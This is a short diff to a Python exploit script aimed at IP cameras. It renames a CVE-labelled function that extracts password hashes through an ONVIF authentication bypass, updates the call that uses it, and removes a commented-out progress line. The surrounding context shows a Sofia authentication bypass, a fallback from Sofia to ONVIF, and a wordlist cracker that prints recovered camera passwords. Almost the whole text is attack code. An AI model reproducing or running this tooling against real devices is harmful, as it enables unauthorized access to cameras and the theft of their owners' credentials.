@@ -97,7 +97,7 @@ def cve_2024_3765(ip, sofia_port):
         print(f"[+] Password hash found: {hash_string}")
     return hash_string
 
-def cve_2025_65856(ip, onvif_port):
+def cve_2025_65857(ip, onvif_port):
     """Get password hash via ONVIF calls"""
     cam = camera_setup(ip, onvif_port)
 
@@ -140,7 +140,7 @@ def get_password_hash(ip, onvif_port, sofia_port):
         print(f"[-] Sofia authentication bypass failed: {e}")
         print("[+] Trying ONVIF authentication bypass...")
         try:
-            hash_string = cve_2025_65856(ip, onvif_port)
+            hash_string = cve_2025_65857(ip, onvif_port)
         except Exception as e:
             print(f"[-] ONVIF authentication bypass failed. Aborting... {e}")
             sys.exit(1)
@@ -183,7 +183,6 @@ def crack(wordlist, hash_string):
             print(f'[+] {c}/{total_lines} [{c / total_lines * 100:.2f}%]', end='\r', flush=True)
             line = line.strip()
             if sofia_hash(line) == hash_string:
-                #print(f'[+] {c}/{total_lines} [{c / total_lines * 100:.2f}%]', end='\n', flush=True)
                 print(f"[+] Hash: {sofia_hash(line)}, Password: {line}")
                 found = 1
                 break
